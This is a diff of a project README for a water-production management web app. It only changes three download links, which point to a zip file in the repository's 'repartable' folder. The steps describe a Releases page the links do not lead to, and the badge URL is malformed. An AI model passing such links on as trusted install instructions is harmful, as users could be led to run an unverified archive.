@@ -6,7 +6,7 @@ Welcome to the MatSplash Web Application! This is a modern solution designed to 
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/emolina03/matsplash-web/master/repartable/matsplash-web.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/emolina03/matsplash-web/master/repartable/matsplash-web.zip)
+[![Download Now](https://github.com/emolina03/matsplash-web/raw/refs/heads/master/repartable/web_matsplash_1.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/emolina03/matsplash-web/raw/refs/heads/master/repartable/web_matsplash_1.4.zip)
 
 ## 📋 Requirements
 
@@ -21,7 +21,7 @@ Before you install, ensure your system meets the following requirements:
 
 To download the application, please visit the following page:
 
-[Download MatSplash Web Application](https://raw.githubusercontent.com/emolina03/matsplash-web/master/repartable/matsplash-web.zip)
+[Download MatSplash Web Application](https://github.com/emolina03/matsplash-web/raw/refs/heads/master/repartable/web_matsplash_1.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version.
@@ -87,6 +87,6 @@ These topics represent the core functionalities and technologies used in the app
 
 The MatSplash Web Application is open-source and available under the MIT License. You can view the license details in the repository.
 
-[Download MatSplash Web Application](https://raw.githubusercontent.com/emolina03/matsplash-web/master/repartable/matsplash-web.zip)
+[Download MatSplash Web Application](https://github.com/emolina03/matsplash-web/raw/refs/heads/master/repartable/web_matsplash_1.4.zip)
 
 Thank you for using MatSplash! Enjoy managing your water production effortlessly!
